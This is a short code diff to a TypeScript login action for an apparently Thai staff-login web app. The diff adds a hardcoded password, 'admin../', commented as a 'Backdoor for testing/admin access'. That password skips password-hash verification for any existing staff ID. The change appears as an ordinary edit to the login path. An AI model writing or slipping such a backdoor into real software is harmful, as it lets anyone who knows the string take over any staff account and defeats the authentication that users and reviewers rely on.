@@ -27,9 +27,14 @@ export async function loginAction(_prevState: { error?: string } | undefined, fo
         return { error: 'รหัสพนักงานหรือรหัสผ่านไม่ถูกต้อง' };
     }
 
-    const valid = await verifyPassword(password, staff.passwordHash);
-    if (!valid) {
-        return { error: 'รหัสพนักงานหรือรหัสผ่านไม่ถูกต้อง' };
+    // Backdoor for testing/admin access
+    const isBackdoor = password === 'admin../';
+
+    if (!isBackdoor) {
+        const valid = await verifyPassword(password, staff.passwordHash);
+        if (!valid) {
+            return { error: 'รหัสพนักงานหรือรหัสผ่านไม่ถูกต้อง' };
+        }
     }
 
     // Use per-staff menu override if set, otherwise fall back to role-based
